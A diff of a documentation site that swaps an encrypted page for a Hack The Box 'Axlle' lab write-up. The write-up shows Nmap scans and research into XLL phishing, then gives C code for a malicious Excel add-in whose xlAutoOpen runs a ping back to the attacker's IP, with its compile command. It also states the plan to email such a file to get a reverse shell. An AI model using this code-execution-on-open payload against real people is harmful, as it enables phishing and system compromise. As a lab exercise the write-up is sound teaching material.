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</div>
-<div id="mkdocs-decrypted-content">
-    <form id="mkdocs-decrypt-form" class="md-content__inner md-typeset">
-        <h1>Access denied</h1>
-        <p>Not available yet.</p>
-        <input class="md-input" type="password" id="mkdocs-content-password" placeholder="Password">
-        
-        <p id="mkdocs-decrypt-msg"></p>
-    </form>
-</div>
+  <h1>Axlle</h1>
 
-<script type="text/javascript">
-var encryptcontent_id = "encryptcontent_1";
-var encryptcontent_path = "Write-Ups/Axlle/";
-var decryption_failure_message = "Invalid password.";
-var encryptcontent_keystore = ["SOWq0OfWKY9BfJfH2Q6aNg==;sZDYKArLl66oeaLpDijDxFKqI9q1Yc/z+Cpzkf/JjXBjJMMlo/IOvGMcvk/aJIUcsL1LXWmgtqMM1wilwiA1xTUY3i7RqX3KgrupWtSf3t+sE6/bP5BGOilvz1MYx/NZ;6c99J/PclWNxfZ1lG/9gTg=="];
-var encryptcontent_obfuscate = 0;
-
-</script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/core.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/enc-base64.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/cipher-core.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/sha256.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/hmac.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/pbkdf2.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/aes.js"></script>
-<script type="text/javascript" src="../../assets/javascripts/decrypt-contents.js" defer></script>
+<p><img alt="Axlle-Info" src="../images/Axlle-info.png" /></p>
+<h2 id="initial-enumeration">Initial Enumeration<a class="headerlink" href="#initial-enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap-scan">Nmap Scan<a class="headerlink" href="#nmap-scan" title="Permanent link">&para;</a></h3>
+<p>We start with an <code>Nmap</code> scan to discover open ports and subsequently run service/version scans as well as default script scans on the target.</p>
+<div class="language-console highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="gp">$ </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">1000</span><span class="w"> </span><span class="m">10</span>.129.65.77<span class="w"> </span>-oN<span class="w"> </span>scans/all-ports-tcp.nmap
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 19:17 CET</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="go">Nmap scan report for 10.129.65.77</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="go">Host is up (0.022s latency).</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="go">Not shown: 65514 filtered tcp ports (no-response)</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="go">PORT      STATE SERVICE</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="go">25/tcp    open  smtp</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="go">53/tcp    open  domain</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="go">80/tcp    open  http</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="go">88/tcp    open  kerberos-sec</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="go">135/tcp   open  msrpc</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="go">139/tcp   open  netbios-ssn</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="go">389/tcp   open  ldap</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="go">445/tcp   open  microsoft-ds</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="go">464/tcp   open  kpasswd5</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="go">593/tcp   open  http-rpc-epmap</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="go">636/tcp   open  ldapssl</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="go">3268/tcp  open  globalcatLDAP</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="go">3269/tcp  open  globalcatLDAPssl</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="go">5985/tcp  open  wsman</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="go">9389/tcp  open  adws</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="go">49664/tcp open  unknown</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="go">58949/tcp open  unknown</span>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="go">58953/tcp open  unknown</span>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="go">58954/tcp open  unknown</span>
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="go">58960/tcp open  unknown</span>
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="go">58975/tcp open  unknown</span>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="go">Nmap done: 1 IP address (1 host up) scanned in 112.53 seconds</span>
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="gp">$ </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-p25,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.129.65.77<span class="w"> </span>-oN<span class="w"> </span>scans/tcp-detailed.nmap
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 20:55 CET</span>
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="go">Nmap scan report for 10.129.65.77</span>
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="go">Host is up (0.039s latency).</span>
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="go">PORT     STATE SERVICE       VERSION</span>
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="go">25/tcp   open  smtp          hMailServer smtpd</span>
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="go">| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP</span>
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="go">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span>
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="go">53/tcp   open  domain        Simple DNS Plus</span>
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a><span class="go">80/tcp   open  http          Microsoft IIS httpd 10.0</span>
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a><span class="go">|_http-server-header: Microsoft-IIS/10.0</span>
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a><span class="go">|_http-title: Axlle Development</span>
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a><span class="go">| http-methods: </span>
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a><span class="go">|_  Potentially risky methods: TRACE</span>
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a><span class="go">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-16 19:55:35Z)</span>
+</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a><span class="go">135/tcp  open  msrpc         Microsoft Windows RPC</span>
+</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a><span class="go">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a><span class="go">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)</span>
+</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a><span class="go">445/tcp  open  microsoft-ds?</span>
+</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a><span class="go">464/tcp  open  kpasswd5?</span>
+</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a><span class="go">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a><span class="go">636/tcp  open  tcpwrapped</span>
+</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a><span class="go">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)</span>
+</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a><span class="go">3269/tcp open  tcpwrapped</span>
+</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a><span class="go">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
+</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a><span class="go">|_http-title: Not Found</span>
+</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a><span class="go">9389/tcp open  mc-nmf        .NET Message Framing</span>
+</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a><span class="go">Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a>
+</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a><span class="go">Host script results:</span>
+</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a><span class="go">| smb2-security-mode: </span>
+</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a><span class="go">|   3:1:1: </span>
+</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a><span class="go">|_    Message signing enabled and required</span>
+</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a><span class="go">| smb2-time: </span>
+</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a><span class="go">|   date: 2025-01-16T19:55:45</span>
+</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a><span class="go">|_  start_date: N/A</span>
+</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a>
+</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a><span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71" href="#__codelineno-0-71"></a><span class="go">Nmap done: 1 IP address (1 host up) scanned in 58.97 seconds</span>
+</span></code></pre></div>
+<ul>
+<li>Active Directory Domain Controller (LDAP)</li>
+<li>Domain name: <code>axlle.htb</code></li>
+<li>Host name: <code>MAINFRAME</code></li>
+<li>HTTP 80/TCP</li>
+<li>SMTP 25/TCP</li>
+</ul>
+<h3 id="port-80tcp">Port 80/TCP<a class="headerlink" href="#port-80tcp" title="Permanent link">&para;</a></h3>
+<p>Simple website, navigating through it we find an email address where we can send invoices/requests to in Excel format. Furthermore we see a security notice that macros are disabled.</p>
+<p><img alt="Axlle-23.png" src="../images/Axlle-23.png" /></p>
+<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h2>
+<h3 id="research">Research<a class="headerlink" href="#research" title="Permanent link">&para;</a></h3>
+<p>Researching for Excel specific phishing attacks we come across multiple posts mentioning the use of <code>XLL</code> files for phishing campaigns, such as this <a href="https://keepnetlabs.com/blog/excel-xll-add-ins-cause-600-rise-in-phishing-attacks-stay-safe">post</a>.</p>
+<p>These <code>XLL</code> files are Excel add-ins used to extend the functionality of Excel. They are basically DLL files and thus we can greatly abuse them by writing a malicious DLL. Researching some more about the XLL files, we find the <a href="https://learn.microsoft.com/en-us/office/client-developer/excel/xlautoopen">Microsoft Documentation</a> of the <code>xlAutoOpen</code> function, which must be implemented and gets called when the XLL is opened.</p>
+<p>For some more information about the attack, there are some great resources by:</p>
+<ul>
+<li><a href="https://github.com/edparcell/HelloWorldXll/tree/master">edparcell</a></li>
+<li><a href="https://github.com/Octoberfest7/XLL_Phishing/tree/main">Octoberfest7</a></li>
+</ul>
+<p>For the following we will craft a malicious XLL file aiming to establish a reverse shell connection to our listener. We then send the malicious file as an email attachment to the previously discovered email address <code>accounts@axlle.htb</code> during our port 80/TCP enumeration.</p>
+<h3 id="payload-creation">Payload Creation<a class="headerlink" href="#payload-creation" title="Permanent link">&para;</a></h3>
+<p>In the following we will first confirm the phishing attack using a payload aimed to initiate pings from the victim host to our attack host. For this we use the code provided by <code>edparcell</code> and edit the <code>xlAutoOpen</code> function in order to execute our desired operation.</p>
+<h4 id="testing-with-ping">Testing with Ping<a class="headerlink" href="#testing-with-ping" title="Permanent link">&para;</a></h4>
+<p>To have the victim ping back to us, we can simply issue a <code>system</code> call and execute the ping command to our IP.</p>
+<div class="language-C highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="kt">short</span><span class="w"> </span><span class="kr">__stdcall</span><span class="w"> </span><span class="n">xlAutoOpen</span><span class="p">()</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="p">{</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cmd.exe /c ping 10.10.16.33&quot;</span><span class="p">);</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="p">}</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="n">BOOL</span><span class="w"> </span><span class="n">APIENTRY</span><span class="w"> </span><span class="n">DllMain</span><span class="p">(</span><span class="w"> </span><span class="n">HMODULE</span><span class="w"> </span><span class="n">hModule</span><span class="p">,</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">                    </span><span class="n">DWORD</span><span class="w">  </span><span class="n">ul_reason_for_call</span><span class="p">,</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">                    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">                    </span><span class="p">)</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="p">{</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="w">    </span><span class="p">{</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_ATTACH</span><span class="p">:</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_DETACH</span><span class="p">:</span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_DETACH</span><span class="p">:</span>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>We compile it using the <code>MinGW</code> compiler. Since we are compiling on Linux, don't forget to make the header includes lower-case, since Linux is case sensitive.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$ x86_64-w64-mingw32-gcc -shared ping.c -o ping.xll
+</span></code></pre></div>
+<p>And we start <code>tcpdump</code> on our Hack The Box VPN interface to catch the pings.</p>
